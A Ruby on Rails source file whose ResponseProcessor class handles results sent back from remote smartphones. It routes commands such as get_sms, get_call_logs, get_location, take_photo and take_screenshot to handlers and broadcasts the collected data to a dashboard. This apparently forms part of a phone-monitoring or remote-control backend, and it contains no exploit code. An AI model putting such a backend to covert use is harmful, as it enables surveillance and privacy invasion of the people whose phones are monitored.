class ResponseProcessor
  def self.process(data)
    new(data).process
  end
  
  def initialize(data)
    @data = data.with_indifferent_access
    @request_id = @data[:request_id]
    @command = @data[:command]
    @response = @data[:response]
    @error = @data[:error]
  end
  
  def process
    return unless @request_id
    
    pending_command = PendingCommand.find_by(request_id: @request_id)
    return unless pending_command
    
    if @error.present?
      pending_command.mark_failed(@error)
      Rails.logger.error("Command #{@command} failed: #{@error}")
      return
    end
    
    # Route to specific processor based on command
    processor_class = command_processor(@command)
    if processor_class
      processor_class.new(pending_command, @response).process
    else
      # Generic completion
      pending_command.mark_completed(@response)
    end
    
    # Broadcast completion to UI
    ActionCable.server.broadcast(
      "command_status_#{pending_command.smartphone.device_id}",
      {
        request_id: @request_id,
        status: 'completed',
        data: @response
      }
    )
  end
  
  private
  
  def command_processor(command)
    case command
    when 'get_contacts'
      ContactsResponseProcessor
    when 'get_call_logs'
      CallLogsResponseProcessor
    when 'get_location'
      LocationResponseProcessor
    when 'get_device_info'
      DeviceInfoResponseProcessor
    when 'get_sms'
      SmsResponseProcessor
    when 'take_screenshot'
      ScreenshotResponseProcessor
    when 'take_photo'
      PhotoResponseProcessor
    when 'get_installed_apps'
      AppsResponseProcessor
    else
      nil
    end
  end
end
